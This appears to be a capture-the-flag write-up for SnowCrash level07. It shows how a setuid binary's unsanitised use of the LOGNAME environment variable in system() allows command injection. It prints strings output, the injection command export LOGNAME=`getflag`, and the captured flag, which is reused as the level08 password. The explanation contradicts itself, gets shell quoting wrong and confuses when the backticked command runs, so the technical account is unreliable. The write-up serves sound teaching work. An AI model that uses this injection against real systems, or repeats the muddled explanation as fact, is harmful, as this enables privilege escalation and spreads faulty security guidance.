`strings:` A Linux utility that prints the sequences of printable ASCII characters present in a binary. 

`getenv():` Returns the value of an environment variable in C.

`system():` Runs a shell command in C.

`setresuid()/setresgid()`: These functions alter the user and group ids, respectively, and might be used to switch what privileges the program runs as.

#### Running strings level07 shows that:

We notice that the binary uses several system and C standard library functions, which includes `getenv(), system(), setresuid(), and setresgid()` .
One of the environment variables which it uses is `LOGNAME`.
There is a line `/bin/echo %s`, from which it seems like the program calls the `system()` function with a shell command containing `LOGNAME` variable in an echo command.
Vulnerability in Binary
The program utilizes `getenv("LOGNAME")` to retrieve the value of the environment variable `LOGNAME`. The return from `getenv()` is utilized as an argument to the `system()`` function for execution, which essentially executes echo `LOGNAME`. Thus, it is vulnerable to a possible command injection attack.

We can exploit the value of LOGNAME to execute shell commands without any limitation. We'll set LOGNAME to the `getflag command` (where it fetches the flag for the current level). The program will print LOGNAME instead of executing getflag.


## 1. Run strings on the binary:

``` bash
level07@SnowCrash:~$strings level07
/lib/ld-linux.so.2
zE&9qU
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
 UWVS
[^_]
LOGNAME
/bin/echo %s 
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
	 gid
	 uid
/home/user/level07
/usr/include/i386-linux-gnu/bits
/usr/include
level07.c
types.h
unistd.h
long long int
/home/user/level07/level07.c
__uid_t
envp
long long unsigned int
setresuid
getenv
setresgid
unsigned char
system
GNU C 4.6.3
argc
__gid_t
short unsigned int
main
asprintf
short int
buffer
argv
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
crtstuff.c
__CTOR_LIST__
__DTOR_LIST__
__JCR_LIST__
__do_global_dtors_aux
completed.6159
dtor_idx.6161
frame_dummy
__CTOR_END
```

This will give us some idea of how the program uses the LOGNAME environment variable and calls the system() function with a command like /bin/echo.

## 2. Setting the LOGNAME environment variable to execute getflag:

We can exploit this by setting the LOGNAME to the command we want executed - in this case, getflag. We do this by using:

``` bash
level07@SnowCrash:~$ export LOGNAME=`getflag`
```
Run the binary: The binary run just with LOGNAME set to the getflag command will be executed:

```
bash
/bin/echo `getflag`
```

As the program is using the system() function, this command will actually execute getflag and print the flag.
LOGNAME is an environment variable used by the program. So, by setting LOGNAME to getflag, we inject this command into the system("/bin/echo LOGNAME") call.
Backticks: In the command 
``` bash 
export LOGNAME=\'getflag\`
```
the backticks execute the getflag command and its output is assigned to the LOGNAME environment variable. That's the classical shell injection since the value assigned to LOGNAMEis executed within the system()` call.
Output: Running the binary after setting LOGNAME yields:

``` bash
level07@SnowCrash:~$  ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## 3. Switch to Level08: Using the flag, to switch to the next level:

``` bash
$ su level08
Password: fiumuikeil55xe9cu4dood66h
``` 
 The program insecurely passes an environment variable - without any kind of sanitization - to the system() function. System interprets its input as a shell command so anything we set in LOGNAME gets executed along with the command. Meaning, we can inject and execute arbitrary commands such as getflag.
